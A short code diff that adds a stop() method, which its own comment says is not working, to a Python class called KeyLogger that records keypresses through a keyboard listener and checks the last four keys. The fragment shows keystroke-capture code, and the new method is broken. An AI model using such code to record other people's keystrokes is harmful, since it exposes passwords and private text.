@@ -24,6 +24,10 @@ class KeyLogger:
         with Listener(on_press=self.on_press) as listener:
             listener.join()
 
+    # stop function is not working right now
+    def stop(self):
+        Listener(on_press=self.on_press).stop()
+        
     def check(self):
         #print(self.coolList)
         checkList = self.coolList[-4:]
